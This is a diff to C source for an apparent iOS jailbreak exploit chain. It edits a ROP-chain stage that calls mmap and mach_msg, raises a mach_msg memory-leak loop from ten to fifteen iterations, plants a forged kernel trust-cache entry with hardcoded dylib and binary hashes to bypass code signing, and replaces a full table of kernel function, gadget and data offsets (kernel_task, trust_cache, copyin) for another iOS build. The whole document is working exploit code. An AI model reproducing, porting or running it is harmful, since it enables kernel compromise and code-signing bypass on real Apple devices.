@@ -664,6 +664,8 @@ void stage2(offset_struct_t * offsets,char * base_dir) {
 	CALL("__mmap",offsets->errno_offset & ~0x3fff, 0x4000, PROT_READ|PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, 0,0,0,0);
 
 
+	// fixup mach_msg
+	CALL("__mmap",offsets->mach_msg_offset & ~0x3fff, 0x4000, PROT_READ|PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, 0,0,0,0);
 #if 0
 
 	char * dylib_str = malloc(100);
@@ -731,6 +733,7 @@ void stage2(offset_struct_t * offsets,char * base_dir) {
 
 	*/
 
+#if 0
 	DEFINE_ROP_VAR("reply_port",sizeof(mach_port_t),&buf);
 	CALL_FUNC_RET_SAVE_VAR("reply_port",get_addr_from_name(offsets,"mach_reply_port"),0,0,0,0,0,0,0,0);
 	/*
@@ -853,6 +856,7 @@ void stage2(offset_struct_t * offsets,char * base_dir) {
 	ROP_VAR_ARG("cmp_str",1);
 	ROP_VAR_ARG_W_OFFSET("get_property_msg",2,offsetof(struct get_property_reply,data));
 	CALL_FUNC_RET_SAVE_VAR("strcmp_retval",get_addr_from_name(offsets,"strcmp"),0,0,0,0,0,0,0,0);
+#endif
 
 	ADD_LOOP_START("test_loop")
 		ROP_VAR_ARG_HOW_MANY(1);
@@ -860,11 +864,12 @@ void stage2(offset_struct_t * offsets,char * base_dir) {
 		CALL("write",1,0,1024,0,0,0,0,0);
 
 
-		
+	/*	
 		// set x0 to the_one
 		SET_X0_FROM_ROP_VAR("strcmp_retval");
 		// break out of the loop if x0 is nonzero
 		ADD_LOOP_BREAK_IF_X0_NONZERO("test_loop");
+		*/
 	ADD_LOOP_END();
 #else
 
@@ -954,8 +959,8 @@ void stage2(offset_struct_t * offsets,char * base_dir) {
 	struct trust_chain * new_entry = malloc(sizeof(struct trust_chain));
 	snprintf((char*)&new_entry->uuid,16,"TURNDOWNFORWHAT?");
 	new_entry->count = 2;
-	hash_t my_dylib_hash = {0x6e,0xa5,0x78,0x0d,0x0d,0x1b,0x49,0xad,0x99,0x03,0x82,0x08,0xa6,0x8c,0xc9,0x7c,0x2e,0xa4,0xa9,0x92};
-	hash_t my_binary_hash = {0xd3,0x17,0x27,0x38,0xc1,0x33,0x1d,0x75,0xc5,0xbc,0x41,0xb7,0xcd,0x9b,0x4b,0xa7,0xfc,0x75,0xcb,0x73};
+	hash_t my_dylib_hash = {0x01,0xea,0x3a,0xea,0x23,0x45,0x5f,0xc3,0x07,0x53,0xbe,0xa7,0x78,0x2d,0x1b,0x17,0xb1,0xa8,0x75,0xef};
+	hash_t my_binary_hash = {0x30,0x46,0x97,0xbb,0x51,0xc0,0xde,0x21,0x5c,0x3c,0xb5,0xa7,0x33,0xb2,0x1b,0x34,0xe1,0xa9,0xe5,0x3f};
 	memcpy(&new_entry->hash[0],my_dylib_hash,20);
 	memcpy(&new_entry->hash[1],my_binary_hash,20);
 	DEFINE_ROP_VAR("new_trust_chain_entry",sizeof(struct trust_chain),new_entry);
@@ -1253,7 +1258,7 @@ _STRUCT_ARM_THREAD_STATE64
 		// no need for another loop in rop... we can just unroll this one here
 		
 		ROP_VAR_CPY_W_OFFSET("memleak_msg",offsetof(MEMLEAK_Request,Head.msgh_remote_port),"client",0,sizeof(mach_port_t)); // set memleak_msg->Head.msgh_request_port
-		for (int i = 0; i < 10; i++) {
+		for (int i = 0; i < 15; i++) {
 			ROP_VAR_ARG_HOW_MANY(1);
 			ROP_VAR_ARG("memleak_msg",1);
 			CALL("mach_msg",0,MACH_SEND_MSG | MACH_MSG_OPTION_NONE, sizeof(MEMLEAK_msg),0,0,0,0,0);
@@ -1603,32 +1608,32 @@ _STRUCT_ARM_THREAD_STATE64
 	} offsets_t;
 	offsets_t * lib_offsets = malloc(sizeof(offsets_t));
 	lib_offsets->constant.kernel_image_base = 0xffffff7000400000;
-	lib_offsets->funcs.copyin = 0xfffffff0071a05ac;
-	lib_offsets->funcs.copyout = 0xfffffff0071a07dc;
-	lib_offsets->funcs.current_task = 0xfffffff0070ebe88;
-	lib_offsets->funcs.get_bsdtask_info = 0xfffffff007101550;
-	lib_offsets->funcs.vm_map_wire_external = 0xfffffff00714a35c;
-	lib_offsets->funcs.vfs_context_current = 0xfffffff0071f4ffc;
-	lib_offsets->funcs.vnode_lookup = 0xfffffff0071d6c74;
-	lib_offsets->funcs.osunserializexml = 0xfffffff0074c485c;
-	lib_offsets->funcs.smalloc = 0xfffffff006b34a70;
-	lib_offsets->funcs.ipc_port_alloc_special = 0xfffffff0070b0288;
-	lib_offsets->funcs.ipc_kobject_set = 0xfffffff0070c5470;
-	lib_offsets->funcs.ipc_port_make_send = 0xfffffff0070afd14;
-	lib_offsets->gadgets.add_x0_x0_ret = 0xfffffff0073b71e4;
-	lib_offsets->data.realhost = 0xfffffff0075b8b98;
-	lib_offsets->data.zone_map = 0xfffffff0075d5e20;
-	lib_offsets->data.kernel_task = 0xfffffff007622048;
-	lib_offsets->data.kern_proc = 0xfffffff0076220a0;
-	lib_offsets->data.rootvnode = 0xfffffff007622088;
-	lib_offsets->data.osboolean_true = 0xfffffff00761fa48;
-	lib_offsets->data.trust_cache = 0xfffffff007687428;
+	lib_offsets->funcs.copyin = 0xfffffff0071aa804;
+	lib_offsets->funcs.copyout = 0xfffffff0071aaa28;
+	lib_offsets->funcs.current_task = 0xfffffff0070f4d80;
+	lib_offsets->funcs.get_bsdtask_info = 0xfffffff00710a960;
+	lib_offsets->funcs.vm_map_wire_external = 0xfffffff007154fb8;
+	lib_offsets->funcs.vfs_context_current = 0xfffffff0071fe2f0;
+	lib_offsets->funcs.vnode_lookup = 0xfffffff0071dff70;
+	lib_offsets->funcs.osunserializexml = 0xfffffff0074e8f38;
+	lib_offsets->funcs.smalloc = 0xfffffff006b1acb0;
+	lib_offsets->funcs.ipc_port_alloc_special = 0xfffffff0070b9328;
+	lib_offsets->funcs.ipc_kobject_set = 0xfffffff0070cf2c8;
+	lib_offsets->funcs.ipc_port_make_send = 0xfffffff0070b8aa4;
+	lib_offsets->gadgets.add_x0_x0_ret = 0xfffffff0073ce75c;
+	lib_offsets->data.realhost = 0xfffffff0075e2b98;
+	lib_offsets->data.zone_map = 0xfffffff0075ffe50;
+	lib_offsets->data.kernel_task = 0xfffffff0075dd048;
+	lib_offsets->data.kern_proc = 0xfffffff0075dd0a0;
+	lib_offsets->data.rootvnode = 0xfffffff0075dd088;
+	lib_offsets->data.osboolean_true = 0xfffffff00764c468;
+	lib_offsets->data.trust_cache = 0xfffffff0076b8ee8;
 	// maybe wrong
 	lib_offsets->struct_offsets.is_task_offset = 0x28; 
 	lib_offsets->struct_offsets.task_itk_self = 0xd8;
 	lib_offsets->struct_offsets.itk_registered = 0x2f0;
 	lib_offsets->struct_offsets.ipr_size = 0x8;
-	lib_offsets->struct_offsets.sizeof_task = 0x568;
+	lib_offsets->struct_offsets.sizeof_task = 0x5c8;
 	// iosurface stuff isn't set and also isn't used
 	lib_offsets->userland_funcs.write = get_addr_from_name(offsets,"write") - 0x180000000 + offsets->new_cache_addr;
 	lib_offsets->userland_funcs.IOConnectTrap6 = get_addr_from_name(offsets,"IOConnectTrap6") - 0x180000000 + offsets->new_cache_addr;
